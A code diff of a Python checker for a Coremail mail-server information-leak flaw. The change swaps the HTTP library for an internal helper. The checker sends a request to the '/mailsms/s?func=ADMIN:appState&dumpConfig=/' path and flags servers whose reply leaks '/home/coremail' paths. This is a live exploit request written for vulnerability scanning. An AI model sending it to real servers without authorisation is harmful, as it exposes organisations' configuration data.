@@ -5,9 +5,7 @@ name: 论客邮箱信息泄露漏洞
 author: Anonymousdescription: 论客邮箱信息泄露漏洞
 '''
 
-import requests
-import requests.packages.urllib3
-requests.packages.urllib3.disable_warnings()
+from app.lib.utils.request import request
 
 class Coremail_Information_Leak_BaseVerify:
     def __init__(self, url):
@@ -20,7 +18,7 @@ class Coremail_Information_Leak_BaseVerify:
         if not self.url.startswith("http") and not self.url.startswith("https"):
             self.url = "http://" + self.url
         try:
-            req = requests.get(self.url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/", headers = self.headers, allow_redirects = False, verify = False)
+            req = request.get(self.url + "/mailsms/s?func=ADMIN:appState&dumpConfig=/", headers = self.headers)
             if req.status_code != '404' and '/home/coremail' in req.text:
                 print('存在论客邮箱信息泄露漏洞')
                 return True
